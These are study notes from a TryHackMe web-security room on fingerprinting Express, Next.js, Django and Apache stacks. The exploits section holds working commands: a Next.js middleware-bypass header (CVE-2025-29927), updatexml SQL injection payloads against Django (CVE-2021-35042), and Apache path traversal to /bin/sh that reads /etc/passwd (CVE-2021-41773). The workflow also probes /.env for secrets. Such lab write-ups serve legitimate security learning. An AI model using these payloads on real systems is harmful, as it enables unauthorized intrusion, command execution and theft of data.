# Web Stack Fingerprinting and Exploitation

**THM Room:** Modern Web Stacks (MERN, Next.js, Django, LAMP)  
**Path:** Jr Penetration Tester / Web Application Security  
**Completed:** June 2026

---

## The Core Concept

Every web stack leaks its identity through HTTP headers, cookie names, error messages, and HTML artifacts. Before you touch any exploit payload, identify what you're dealing with. The workflow is always the same:

```
1. Read the signals (headers, errors, cookies)
2. Confirm the version
3. Execute the attack chain
```

---

## The Four Stacks — Quick Fingerprint Reference

### MERN / Express.js (Node.js)

| Signal | Value | Confidence |
|---|---|---|
| `X-Powered-By` header | `Express` | High |
| Session cookie | `connect.sid` | High |
| Unhandled route error | `Cannot GET /path` (plain text) | High |
| Common ports | 3000, 5000 | Medium |

```bash
curl -I http://TARGET:3000/
curl http://TARGET:3000/nonexistent
curl -c cookies.txt http://TARGET:3000/
```

**Associated vulnerability:** Prototype Pollution (CVE-2020-8203) — merge functions that don't filter `__proto__`

---

### Next.js (React framework on Node.js)

| Signal | Value | Confidence |
|---|---|---|
| `X-Powered-By` header | `Next.js` | High |
| HTML source | `window.__next_f` in script tag | High — confirms App Router |
| Static asset paths | `/_next/static/chunks/` | High |
| Custom headers | `x-nextjs-cache`, `x-nextjs-prerender` | High — confirms production mode |
| Protected route | HTTP 307 redirect to /login | Medium |

```bash
curl -I http://TARGET:3001/
curl http://TARGET:3001/nonexistent
# Check page source for window.__next_f
curl -s http://TARGET:3001/ | grep "next_f"
```

**Critical note:** CVE-2025-29927 only affects production mode (`npm run build && npm start`). Development mode (`next dev`) is NOT vulnerable.

**Associated vulnerability:** CVE-2025-29927 — middleware bypass via `x-middleware-subrequest` header

---

### Django (Python)

| Signal | Value | Confidence |
|---|---|---|
| `Server` header | `WSGIServer/0.2 CPython/X.X.X` | High |
| Cookie name | `csrftoken` | High |
| `X-Frame-Options` header | `DENY` | High |
| `X-Content-Type-Options` header | `nosniff` | High |
| `Referrer-Policy` header | `same-origin` | Medium |
| HTML POST forms | `csrfmiddlewaretoken` hidden field | High — most reliable |

```bash
curl -I http://TARGET:8000/
curl http://TARGET:8000/admin/  # Django admin always at /admin/
# View source of any POST form for csrfmiddlewaretoken
```

**The combination of X-Frame-Options: DENY + X-Content-Type-Options: nosniff + Referrer-Policy: same-origin together = Django SecurityMiddleware. No other framework applies all three by default.**

**Associated vulnerability:** CVE-2021-35042 — SQL injection via unparameterized `order_by()` when DEBUG=True

---

### LAMP / Apache (Linux, Apache, MySQL, PHP)

| Signal | Value | Confidence |
|---|---|---|
| `Server` header | `Apache/X.X.XX (OS)` | High |
| 404 error page footer | Apache version string | High |
| `/cgi-bin/` response | 403 Forbidden (not 404) | High — mod_cgi enabled |
| Common ports | 80, 8080 | Medium |

```bash
curl -I http://TARGET:8080/
curl http://TARGET:8080/nonexistent  # Check 404 footer for version
curl http://TARGET:8080/cgi-bin/     # 403 = mod_cgi present, 404 = not present
```

**Version-specific CVEs:**
- Apache 2.4.49 → CVE-2021-41773 (path traversal + RCE if mod_cgi enabled)
- Apache 2.4.50 → CVE-2021-42013 (double-encoded bypass of 2.4.49 patch)
- 2.4.51+ → patched

**Associated vulnerability:** CVE-2021-41773 — path traversal via `.%2e/` sequences bypasses filter, mod_cgi enables RCE

---

## CVE Summary from This Room

| Stack | CVE | Impact | CVSS |
|---|---|---|---|
| MERN/Express | CVE-2020-8203 | Prototype pollution → auth bypass | 7.4 High |
| Next.js | CVE-2025-29927 | Single header → full middleware bypass | 9.1 Critical |
| Django | CVE-2021-35042 | SQL injection via ORDER BY | 9.8 Critical |
| Apache LAMP | CVE-2021-41773 | Path traversal + mod_cgi RCE | 9.8 Critical |

---

## The Exploits

### CVE-2025-29927 — Next.js Middleware Bypass

Next.js uses `x-middleware-subrequest` internally to prevent infinite loops. It never verified whether this header came from an internal process or an external client. Including it in a request skips middleware entirely.

```bash
# Root-level middleware.ts
curl -H "x-middleware-subrequest: middleware:middleware:middleware:middleware:middleware" \
  http://TARGET:3001/dashboard

# /src directory structure
curl -H "x-middleware-subrequest: src/middleware:src/middleware:src/middleware:src/middleware:src/middleware" \
  http://TARGET:3001/dashboard
```

**Find protected routes first** — look for 307 redirects:
```bash
gobuster dir -u http://TARGET:3001 -w wordlist.txt -s 307,302
```

---

### CVE-2021-35042 — Django SQL Injection

The `order_by()` method in Django 3.2.x accepted unsanitized user input. The `updatexml()` technique extracts data through MySQL error messages when DEBUG=True.

```bash
# Extract database version
curl -s "http://TARGET:8000/products/?order=updatexml(1,concat(0x7e,(select%20@@version)),1)" | grep -o '~[0-9][^&]*'

# Extract database name
curl -s "http://TARGET:8000/products/?order=updatexml(1,concat(0x7e,(select%20database())),1)" | grep -o '~[0-9a-zA-Z_][^&]*'
```

**Note:** Only works when `DEBUG = True` in Django settings. Production apps with DEBUG=False return a generic 500 — use blind time-based injection with `SLEEP()` as fallback.

---

### CVE-2021-41773 — Apache Path Traversal + RCE

The path traversal filter ran before full URL decoding. `.%2e/` was not recognized as `../` by the filter but resolved as `../` by the OS.

```bash
# Confirm RCE
curl -s --path-as-is "http://TARGET:8080/cgi-bin/.%2e/.%2e/.%2e/.%2e/bin/sh" \
  --data 'echo Content-Type: text/plain; echo; id'

# Read files
curl -s --path-as-is "http://TARGET:8080/cgi-bin/.%2e/.%2e/.%2e/.%2e/bin/sh" \
  --data 'echo Content-Type: text/plain; echo; cat /etc/passwd'
```

**Requirements:**
- Apache exactly 2.4.49 (or 2.4.50 with double-encoding)
- mod_cgi enabled — confirmed by 403 on /cgi-bin/ (not 404)
- `--path-as-is` flag required — without it curl normalizes the traversal before sending

---

## Automated Fingerprinting with Nikto

Nikto runs a quick first pass against any target and surfaces stack signals automatically.

```bash
nikto -h http://TARGET:3000   # MERN
nikto -h http://TARGET:3001   # Next.js
nikto -h http://TARGET:8000   # Django
nikto -h http://TARGET:8080   # Apache
```

**What Nikto catches:**
- Stack identity from headers
- Missing security headers
- Exact Apache version (direct CVE mapping)
- Cookie security flags (missing httponly, secure)
- Dangerous HTTP methods (TRACE enabled)

**What Nikto misses:**
- Application-level injection flaws (prototype pollution, SQL injection in custom endpoints)
- Logic vulnerabilities
- Authentication bypass via custom headers

Nikto confirms the stack. Manual techniques find the application-level vulnerabilities.

---

## Fingerprinting Workflow

```bash
# Step 1 — Get headers
curl -I http://TARGET:PORT/

# Step 2 — Check error format
curl http://TARGET:PORT/nonexistent

# Step 3 — Get session cookie
curl -c cookies.txt http://TARGET:PORT/

# Step 4 — Check page source
curl -s http://TARGET:PORT/ | grep -i "next_f\|csrf\|powered\|framework"

# Step 5 — Check common paths
curl http://TARGET:PORT/admin/
curl http://TARGET:PORT/cgi-bin/
curl http://TARGET:PORT/robots.txt
curl http://TARGET:PORT/.env

# Step 6 — Run Nikto
nikto -h http://TARGET:PORT/
```

---

## Further Reading and Practice

### CVE Deep Dives
- **CVE-2025-29927** — https://nextjs.org/blog/cve-2025-29927 (official Next.js disclosure)
- **CVE-2025-55182** — THM has a dedicated room: "CVE-2025-55182: React2Shell" — covers RSC Flight protocol RCE
- **CVE-2021-41773** — https://nvd.nist.gov/vuln/detail/CVE-2021-41773
- **CVE-2021-35042** — https://nvd.nist.gov/vuln/detail/CVE-2021-35042

### Practice Labs
- **HackTheBox** — search retired machines tagged with Apache, Django, Node.js
- **VulnHub** — DVWA (PHP/MySQL), NodeGoat (Node.js), Django.nV
- **TryHackMe** — OWASP Top 10 room, Web Fundamentals path
- **PortSwigger Web Security Academy** — SQL injection, prototype pollution labs (free)

### Tools to Learn
- **Nikto** — automated web scanner, already on Kali
- **WhatWeb** — more detailed stack fingerprinting than Wappalyzer
- **SQLMap** — automated SQL injection (use after manual confirmation)
- **searchsploit** — search Exploit-DB locally: `searchsploit apache 2.4.49`

### Reference Sites
- **nvd.nist.gov** — full CVE details and scoring
- **exploit-db.com** — working exploit code for CVEs
- **vulners.com** — vulnerability search engine
- **shodan.io** — find live vulnerable targets (for authorized testing only)

---

## Key Takeaways

- Every stack leaks its identity — learn to read the signals before touching payloads
- Version numbers in headers are direct CVE mappings — always note them
- The same three-step workflow applies to every target: read signals, confirm version, execute chain
- Nikto handles automated first pass — manual techniques find application-level flaws
- CVE-2025-29927 is extremely recent (2025) and affects apps built in the last 2-3 years — highly relevant for current bug bounty work
- Apache version disclosure in headers is a misconfiguration finding on its own, before any exploitation
